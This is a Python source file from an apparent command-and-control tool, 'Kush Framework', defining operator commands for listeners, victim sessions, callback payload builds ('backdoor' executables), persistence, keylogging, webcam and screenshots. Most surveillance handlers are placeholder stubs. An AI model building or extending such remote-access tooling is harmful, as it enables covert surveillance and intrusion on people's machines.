# kush-framework/kush/core/command_handler.py
"""
Enhanced command handler with uselistener support
"""

import shlex
import os
import subprocess
from typing import Optional, List
from colorama import Fore, Style

from kush.core.session import Session, SessionManager
from kush.core.payload_builder import PayloadBuilder

class CommandHandler:
    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager
        self.payload_builder = PayloadBuilder()
        
        self.commands = {
            # Listener management
            'uselistener': self.handle_uselistener,
            'startlistener': self.handle_startlistener,
            'stoplistener': self.handle_stoplistener,
            'listeners': self.handle_listeners,
            
            # Session management
            'sessions': self.handle_sessions,
            'use': self.handle_use,
            'back': self.handle_back,
            'info': self.handle_info,
            
            # Payload generation
            'build': self.handle_build,
            'payloads': self.handle_payloads,
            'targets': self.handle_targets,
            
            # System commands
            'sysinfo': self.handle_sysinfo,
            'processes': self.handle_processes,
            'services': self.handle_services,
            
            # Persistence
            'persistence': self.handle_persistence,
            
            # Surveillance
            'screenshot': self.handle_screenshot,
            'webcam': self.handle_webcam,
            'keylogger': self.handle_keylogger,
            
            # Network
            'ifconfig': self.handle_ifconfig,
            'netstat': self.handle_netstat,
            'portscan': self.handle_portscan,
            
            # File operations
            'download': self.handle_download,
            'upload': self.handle_upload,
            'cd': self.handle_cd,
            'ls': self.handle_ls,
            'pwd': self.handle_pwd,
            
            # Framework
            'help': self.handle_help,
            'exit': self.handle_exit,
            'clear': self.handle_clear,
            'version': self.handle_version,
        }
    
    def handle_command(self, user_input: str, current_session: Optional[Session]) -> Optional[str]:
        try:
            parts = shlex.split(user_input)
            if not parts:
                return None
                
            command = parts[0].lower()
            args = parts[1:]
            
            if command in self.commands:
                return self.commands[command](args, current_session)
            else:
                # Try to execute as system command on target
                if current_session:
                    return self.execute_remote_command(user_input, current_session)
                else:
                    return f"{Fore.RED}[-] Unknown command: {command}{Style.RESET_ALL}"
                    
        except Exception as e:
            return f"{Fore.RED}[-] Command error: {e}{Style.RESET_ALL}"
    
    def handle_uselistener(self, args: List[str], current_session: Optional[Session]) -> str:
        """Handle uselistener command like PowerShell Empire"""
        if len(args) != 3:
            return f"""
{Fore.CYAN}Usage: uselistener <type> <host> <port>{Style.RESET_ALL}

{Fore.YELLOW}Listener Types:{Style.RESET_ALL}
  tcp    - TCP listener
  http   - HTTP listener

{Fore.YELLOW}Examples:{Style.RESET_ALL}
  uselistener tcp 0.0.0.0 4444
  uselistener http 192.168.1.100 8080
"""
        
        listener_type, host, port = args
        from kush.core.listener import KushListener
        listener = KushListener()
        
        if listener.uselistener(listener_type, host, port):
            return f"{Fore.GREEN}[+] Listener configured: {listener_type} on {host}:{port}{Style.RESET_ALL}"
        else:
            return f"{Fore.RED}[-] Failed to configure listener{Style.RESET_ALL}"
    
    def handle_startlistener(self, args: List[str], current_session: Optional[Session]) -> str:
        """Start a configured listener"""
        if len(args) != 1:
            return f"{Fore.RED}Usage: startlistener <tcp|http>{Style.RESET_ALL}"
        
        listener_type = args[0]
        from kush.core.listener import KushListener
        listener = KushListener()
        
        if listener.start_listener(listener_type):
            return f"{Fore.GREEN}[+] {listener_type.upper()} listener started{Style.RESET_ALL}"
        else:
            return f"{Fore.RED}[-] Failed to start {listener_type} listener{Style.RESET_ALL}"
    
    def handle_stoplistener(self, args: List[str], current_session: Optional[Session]) -> str:
        """Stop a running listener"""
        if len(args) != 1:
            return f"{Fore.RED}Usage: stoplistener <tcp|http>{Style.RESET_ALL}"
        
        listener_type = args[0]
        from kush.core.listener import KushListener
        listener = KushListener()
        
        if listener.stop_listener(listener_type):
            return f"{Fore.GREEN}[+] {listener_type.upper()} listener stopped{Style.RESET_ALL}"
        else:
            return f"{Fore.RED}[-] Failed to stop {listener_type} listener{Style.RESET_ALL}"
    
    def handle_listeners(self, args: List[str], current_session: Optional[Session]) -> str:
        """List all listeners"""
        from kush.core.listener import KushListener
        listener = KushListener()
        return listener.list_listeners()
    
    def handle_sessions(self, args: List[str], current_session: Optional[Session]) -> str:
        """List all active sessions"""
        sessions = self.session_manager.list_sessions()
        if not sessions:
            return f"{Fore.YELLOW}[*] No active sessions{Style.RESET_ALL}"
        
        output = [f"{Fore.CYAN}[*] Active sessions ({len(sessions)}):{Style.RESET_ALL}"]
        for session in sessions:
            current_indicator = " *" if (current_session and session['session_id'] == current_session.session_id) else ""
            idle_time = session['idle_time']
            idle_color = Fore.RED if idle_time > 60 else Fore.YELLOW if idle_time > 30 else Fore.GREEN
            
            output.append(f"  {session['session_id']}: {session['address'][0]} - {session['os_type']} "
                         f"({session['user']}@{session['hostname']}) "
                         f"[{session['session_type']}] "
                         f"[Idle: {idle_color}{idle_time:.1f}s{Style.RESET_ALL}]{current_indicator}")
        
        return "\n".join(output)
    
    def handle_use(self, args: List[str], current_session: Optional[Session]) -> str:
        """Switch to a session"""
        if not args:
            return f"{Fore.RED}Usage: use <session_id>{Style.RESET_ALL}"
        
        try:
            session_id = int(args[0])
            from kush.core.listener import KushListener
            listener = KushListener()
            
            if listener.switch_session(session_id):
                return f"{Fore.GREEN}[+] Switched to session {session_id}{Style.RESET_ALL}"
            else:
                return f"{Fore.RED}[-] Session {session_id} not found{Style.RESET_ALL}"
        except ValueError:
            return f"{Fore.RED}[-] Invalid session ID{Style.RESET_ALL}"
    
    def handle_build(self, args: List[str], current_session: Optional[Session]) -> str:
        """Build payloads"""
        if len(args) < 3:
            return self._build_help()
        
        target = args[0]
        lhost = args[1]
        lport = args[2]
        output_name = args[3] if len(args) > 3 else None
        
        try:
            result = self.payload_builder.build(
                target=target,
                lhost=lhost,
                lport=lport,
                output_name=output_name
            )
            return result
        except Exception as e:
            return f"{Fore.RED}[-] Build failed: {e}{Style.RESET_ALL}"
    
    def _build_help(self) -> str:
        return f"""
{Fore.CYAN}Build Command Usage:{Style.RESET_ALL}
  build <target> <lhost> <lport> [output_name]

{Fore.YELLOW}Targets:{Style.RESET_ALL}
  windows    - Windows executable
  linux      - Linux executable  
  macos      - macOS executable
  python     - Python script
  vbs        - VBS macro

{Fore.YELLOW}Examples:{Style.RESET_ALL}
  build windows 192.168.1.100 4444 backdoor
  build linux 10.0.0.5 8080 agent
  build python 192.168.1.100 4445 script
"""
    
    def handle_help(self, args: List[str], current_session: Optional[Session]) -> str:
        return f"""
{Fore.CYAN}Kush Framework v2.1 - Available Commands{Style.RESET_ALL}

{Fore.YELLOW}Listener Management:{Style.RESET_ALL}
  uselistener <type> <host> <port>  - Configure listener (like Empire)
  startlistener <type>              - Start configured listener
  stoplistener <type>               - Stop listener
  listeners                         - Show listener status

{Fore.YELLOW}Session Management:{Style.RESET_ALL}
  sessions                          - List active sessions
  use <id>                          - Switch to session
  back                              - Return to main console
  info                              - Show session information

{Fore.YELLOW}Payload Generation:{Style.RESET_ALL}
  build <target> <lh> <lp>          - Build payload
  payloads                          - List generated payloads
  targets                           - Show supported targets

{Fore.YELLOW}System Commands:{Style.RESET_ALL}
  sysinfo                           - Get system information
  processes                         - List running processes
  services                          - List system services

{Fore.YELLOW}Persistence:{Style.RESET_ALL}
  persistence [method]              - Establish persistence

{Fore.YELLOW}Surveillance:{Style.RESET_ALL}
  screenshot                        - Take screenshot
  webcam [capture|stream]           - Webcam operations
  keylogger [start|stop]            - Keylogger control

{Fore.YELLOW}Network:{Style.RESET_ALL}
  ifconfig                          - Network interfaces
  netstat                           - Network connections
  portscan <target>                 - Port scanning

{Fore.YELLOW}File Operations:{Style.RESET_ALL}
  download <file>                   - Download file
  upload <local> <remote>           - Upload file
  cd <path>                         - Change directory
  ls [path]                         - List directory
  pwd                               - Print working directory

{Fore.YELLOW}Framework:{Style.RESET_ALL}
  help                              - Show this help
  exit, quit                        - Exit framework
  clear                             - Clear screen
  version                           - Show version

{Fore.CYAN}Type 'build' without arguments for payload building help.{Style.RESET_ALL}
"""
    
    def handle_version(self, args: List[str], current_session: Optional[Session]) -> str:
        return f"{Fore.CYAN}Kush Framework v2.1 - Advanced Penetration Testing Tool{Style.RESET_ALL}"
    
    def handle_exit(self, args: List[str], current_session: Optional[Session]) -> str:
        return "EXIT"
    
    def handle_back(self, args: List[str], current_session: Optional[Session]) -> str:
        return f"{Fore.GREEN}[+] Returned to main console{Style.RESET_ALL}"
    
    def handle_info(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return f"{Fore.YELLOW}[*] No active session{Style.RESET_ALL}"
        
        info = current_session.to_dict()
        output = [f"{Fore.CYAN}[*] Session {info['session_id']} Information:{Style.RESET_ALL}"]
        
        for key, value in info.items():
            if key not in ['metadata']:
                output.append(f"  {key}: {value}")
        
        return "\n".join(output)
    
    def handle_payloads(self, args: List[str], current_session: Optional[Session]) -> str:
        return self.payload_builder.list_payloads()
    
    def handle_targets(self, args: List[str], current_session: Optional[Session]) -> str:
        targets = self.payload_builder.get_supported_targets()
        output = [f"{Fore.CYAN}[*] Supported targets:{Style.RESET_ALL}"]
        for target in targets:
            output.append(f"  {target}")
        output.append(f"\n{Fore.YELLOW}Usage: build <target> <lhost> <lport> [output_name]{Style.RESET_ALL}")
        return "\n".join(output)
    
    # Placeholder methods for other commands
    def handle_sysinfo(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] System information would be retrieved here"
    
    def handle_processes(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Process list would be retrieved here"
    
    def handle_services(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Services list would be retrieved here"
    
    def handle_persistence(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Persistence would be established here"
    
    def handle_screenshot(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Screenshot would be taken here"
    
    def handle_webcam(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Webcam operation would be performed here"
    
    def handle_keylogger(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Keylogger operation would be performed here"
    
    def handle_ifconfig(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Network interfaces would be listed here"
    
    def handle_netstat(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Network connections would be listed here"
    
    def handle_portscan(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Port scan would be performed here"
    
    def handle_download(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] File download would be performed here"
    
    def handle_upload(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] File upload would be performed here"
    
    def handle_cd(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Directory would be changed here"
    
    def handle_ls(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Directory listing would be shown here"
    
    def handle_pwd(self, args: List[str], current_session: Optional[Session]) -> str:
        if not current_session:
            return "[-] No active session"
        return "[+] Current directory would be shown here"
    
    def handle_clear(self, args: List[str], current_session: Optional[Session]) -> str:
        os.system('clear' if os.name == 'posix' else 'cls')
        return ""
    
    def execute_remote_command(self, command: str, session: Session) -> str:
        """Execute command on remote session"""
        return f"{Fore.YELLOW}[*] Executing on session {session.session_id}: {command}{Style.RESET_ALL}"